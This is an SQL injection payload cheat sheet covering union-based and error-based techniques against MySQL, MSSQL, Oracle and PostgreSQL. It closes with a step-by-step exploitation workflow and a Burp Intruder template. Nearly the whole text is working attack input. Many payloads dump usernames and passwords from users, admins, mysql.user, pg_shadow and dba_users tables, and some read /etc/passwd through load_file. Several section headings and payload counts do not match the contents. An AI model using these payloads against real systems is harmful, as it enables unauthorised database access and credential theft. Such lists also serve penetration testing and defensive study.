### 1.2 Union-based SQLi (Column Matching & Modern Obfuscation) & ### 1.3 Error-based SQLi


1. ' UNION SELECT 1--
2. ' UNION SELECT 1,2--
3. ' UNION SELECT 1,2,3--
4. ' UNION SELECT 1,2,3,4--
5. ' UNION SELECT NULL--
6. ' UNION SELECT NULL,NULL--
7. ' UNION SELECT NULL,NULL,NULL--
8. ' UNION ALL SELECT 1--
9. ' UNION ALL SELECT 1,2--
10. ' UNION ALL SELECT 1,2,3--

11. admin' UNION SELECT 1--
12. admin' UNION SELECT 1,2--
13. admin' UNION SELECT 1,2,3--
14. admin' UNION SELECT NULL--
15. admin' UNION ALL SELECT 1--

16. 1' UNION SELECT 1--
17. 1' UNION SELECT 1,2--
18. 1' UNION SELECT NULL--
19. 1' UNION ALL SELECT 1--

20. ) UNION SELECT 1--
21. ) UNION SELECT 1,2--
22. ) UNION SELECT NULL--
23. ) UNION ALL SELECT 1--

24. ' UNION SELECT 1,@@version--
25. ' UNION SELECT 1,database(),3--
26. ' UNION SELECT 1,user(),database()--
27. ' UNION SELECT 1,schema_name FROM information_schema.schemata--
28. ' UNION SELECT 1,table_name FROM information_schema.tables--

29. admin' UNION SELECT 1,@@version--
30. admin' UNION SELECT NULL,user(),password--
31. admin' UNION SELECT 1,database()--
32. admin' UNION SELECT table_name FROM information_schema.tables--

33. ' UNION SELECT username,password FROM users--
34. ' UNION SELECT login,pass FROM admins--
35. ' UNION SELECT user,pass FROM members--
36. ' UNION SELECT username,password FROM accounts--

37. admin' UNION SELECT username,password FROM users--
38. admin' UNION SELECT login,pass FROM admins--
39. admin' UNION SELECT user,pass FROM members--

40. ' UNION ALL SELECT NULL,username,password--
41. ' UNION ALL SELECT NULL,login,pass--
42. ' UNION ALL SELECT NULL,user,pass--
43. ' UNION ALL SELECT NULL,username,password,NULL--

44. 1' UNION ALL SELECT 1,username,password--
45. 1' UNION ALL SELECT NULL,user,pass--

46. ' UNION SELECT 1,2,concat(username,':',password) FROM users--
47. ' UNION SELECT 1,2,concat(login,':',pass) FROM admins--
48. ' UNION SELECT NULL,NULL,group_concat(username,0x3a,password) FROM users--

49. admin' UNION SELECT table_name,column_name FROM information_schema.columns--
50. admin' UNION SELECT NULL,table_name FROM information_schema.tables--

51. ' UNION SELECT 1 FROM dual--
52. ' UNION SELECT 1,2 FROM dual--
53. ' UNION SELECT NULL FROM dual--

54. ' UNION SELECT banner FROM v$version--
55. ' UNION SELECT username,password FROM dba_users--
56. ' UNION SELECT table_name FROM all_tables--

57. ' UNION SELECT 1,pg_user--
58. ' UNION SELECT usename,passwd FROM pg_shadow--
59. ' UNION SELECT schemaname,tablename FROM pg_tables--

60. 1' UNION SELECT 1,2--
61. 1' UNION SELECT NULL,@@version--
62. 1' UNION SELECT table_name FROM information_schema.tables--

63. )' UNION SELECT 1--
64. )' UNION SELECT 1,2--
65. )' UNION SELECT NULL--

66. ' UNION SELECT 1,2,3 UNION SELECT 4,5,6--
67. ' UNION ALL SELECT 1,2,3 UNION ALL SELECT 4,5,6--

68. ' UNION SELECT 1,(SELECT table_name FROM information_schema.tables LIMIT 1)--
69. ' UNION SELECT 1,(SELECT column_name FROM information_schema.columns LIMIT 1)--

70. admin' UNION SELECT 1,load_file('/etc/passwd')--
71. admin' UNION SELECT 1,hex(load_file('/etc/passwd'))--

72. ' UNION SELECT 1,2,unhex(hex(username)) FROM users--
73. ' UNION SELECT 1,2,hex(password) FROM users--

74. ' UNION SELECT COUNT(*) FROM users--
75. ' UNION SELECT COUNT(*) FROM information_schema.tables--

76. ' UNION SELECT 1,@@datadir--
77. ' UNION SELECT 1,@@basedir--
78. ' UNION SELECT 1,@@version_compile_os--

79. admin' UNION SELECT NULL,user,password FROM mysql.user--
80. admin' UNION SELECT NULL,Host,User FROM mysql.user--

81. ' UNION SELECT 1,2,3 OFFSET 1--
82. ' UNION SELECT 1,2,3 LIMIT 1--

83. ' UNION SELECT * FROM (SELECT 1)a--
84. ' UNION SELECT * FROM (SELECT 1,2)b--

85. 1 UNION SELECT 1--
86. 1 UNION SELECT 1,2--
87. 1 UNION SELECT NULL--

88. ' UNION SELECT 1 WHERE 1=1--
89. ' UNION SELECT 1,2 WHERE 1=1--

90. admin' UNION SELECT 1 ORDER BY 1--
91. admin' UNION SELECT 1 LIMIT 1--

92. '; UNION SELECT 1--
93. '; UNION SELECT 1,2--
94. '; UNION ALL SELECT 1--

95. ' OR 1=1 UNION SELECT 1--
96. ' OR 1=1 UNION SELECT 1,2--
97. admin' OR 1=1 UNION SELECT 1--

98. ' UNION SELECT 1# 
99. ' UNION SELECT 1/*
100. ' UNION SELECT 1,2/**/--



### 1.3 Error-based SQLi

ERROR-BASED LOGIN BYPASS PAYLOADS (100+)

1. MySQL ExtractValue/UPDATEXML (30+)



1. ' AND EXTRACTVALUE(1,concat(0x7e,(SELECT @@version),0x7e))--
2. ' AND EXTRACTVALUE(1,concat(0x7e,(SELECT database()),0x7e))--
3. ' AND EXTRACTVALUE(1,concat(0x7e,user(),0x7e))--
4. ' AND EXTRACTVALUE(1,concat(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 0,1),0x7e))--
5. admin' AND EXTRACTVALUE(1,concat(0x7e,(SELECT @@version),0x7e))--

6. ' AND UPDATEXML(1,concat(0x7e,(SELECT @@version),0x7e),1)--
7. ' AND UPDATEXML(1,concat(0x7e,database(),0x7e),1)--
8. ' AND UPDATEXML(1,concat(0x7e,(SELECT user()),0x7e),1)--
9. admin' AND UPDATEXML(1,concat(0x7e,(SELECT @@version),0x7e),1)--

10. ' AND EXTRACTVALUE(999,concat(0x3a,(SELECT @@version),0x3a))--
11. ' AND EXTRACTVALUE(0x1e,concat(0x3a,database(),0x3a))--

2. MySQL CAST/CONVERT Errors (25+)



12. ' AND 1=CAST((SELECT @@version) AS INT)--
13. ' AND 1=CAST((SELECT database()) AS INT)--
14. ' AND 1=CAST((SELECT user()) AS INT)--
15. admin' AND 1=CAST((SELECT @@version) AS INT)--

16. ' AND 1=CONVERT(INT,(SELECT @@version))--
17. ' AND 1=CONVERT(INT,(SELECT database()))--
18. ' AND 1=CONVERT(VARCHAR,(SELECT @@version))--

19. ' AND 1=CAST(@@version AS SIGNED)--
20. ' AND 1=CAST(database() AS SIGNED)--
21. admin' AND 1=CAST(user() AS SIGNED)--

22. ' OR 1=CAST((CHR(113)||CHR(106)||CHR(113))||(SELECT database())||CHR(113)||CHR(106)||CHR(113) AS CHAR)--
23. admin' OR 1=CAST((SELECT @@version) AS CHAR)--

3. MySQL BIGINT/Geometry Errors (20+)



24. ' AND (SELECT 1 FROM (SELECT COUNT(*),concat((SELECT @@version),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--
25. ' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
26. ' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT NULL UNION SELECT !1)a GROUP BY CONCAT((SELECT @@version),FLOOR(RAND(0)*2)))--
27. admin' AND (SELECT 1 FROM (SELECT COUNT(*),concat((SELECT database()),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--

4. MSSQL-Specific Errors (15+)

28. ' AND 1=CAST((SELECT @@version) AS INT)--
29. '; DECLARE @q VARCHAR(99);SET @q=CAST(DB_NAME() AS VARCHAR(99));SELECT @q--
30. admin'; DECLARE @q VARCHAR(99);SET @q=CAST(@@version AS VARCHAR(99));SELECT @q--

31. ' AND 1=CONVERT(int,(SELECT @@version))--
32. ' AND 1=CONVERT(datetime,(SELECT @@version))--
33. admin' AND 1=CONVERT(int,database())--

5. PostgreSQL Errors (10+)



34. ' AND 1=CAST((SELECT version()) AS INT)--
35. ' AND 1=CAST((SELECT current_database()) AS INT)--
36. admin' AND 1=CAST((SELECT current_user) AS INT)--
ADVANCED ERROR EXTRACTION PAYLOADS (50+)

6. ASCII Character Extraction (15+)



37. admin' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--
38. admin' AND ASCII(SUBSTRING((SELECT @@version),1,1))>53--
39. ' AND ASCII(SUBSTRING(user(),1,1))>114--
40. admin' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 0,1),1,1))>97--

7. LENGTH-Based Errors (10+)



41. admin' AND LENGTH((SELECT * FROM users LIMIT 1))=10--
42. ' AND LENGTH(database())=5--
43. admin' AND LENGTH(@@version)>10--

8. Multi-Query Error Chains (10+)



44. '; SELECT * FROM (SELECT(SLEEP(5)))a; --
45. ' AND 1=0; SELECT @@version; --
46. admin'; SELECT CAST(@@version AS SIGNED); --
URL-ENCODED ERROR PAYLOADS (20+)



47. %27%20AND%20EXTRACTVALUE%281%2Cconcat%280x7e%2C%28SELECT%20%40%40version%29%2C0x7e%29%29--
48. %27%20AND%201%3DCONVERT%28INT%2C%28SELECT%20%40%40version%29%29--
49. %27%20AND%20EXTRACTVALUE%281%2Cconcat%280x3a%2Cdatabase%28%29%2C0x3a%29%29--
ERROR-BASED EXPLOITATION WORKFLOW:



1. Trigger basic error:
   ' AND 1=CAST(@@version AS INT)--

2. Extract version:
   ' AND EXTRACTVALUE(1,concat(0x7e,(SELECT @@version),0x7e))--

3. Extract database:
   ' AND EXTRACTVALUE(1,concat(0x7e,(SELECT database()),0x7e))--

4. Enumerate tables:
   ' AND EXTRACTVALUE(1,concat(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 0,1),0x7e))--

5. Blind char-by-char:
   admin' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 0,1),1,1))>97--

Burp Intruder Setup:



§admin' AND EXTRACTVALUE(1,concat(0x7e,(SELECT @@version),0x7e))--§
Payloads: Step through database(), user(), table_name, etc.

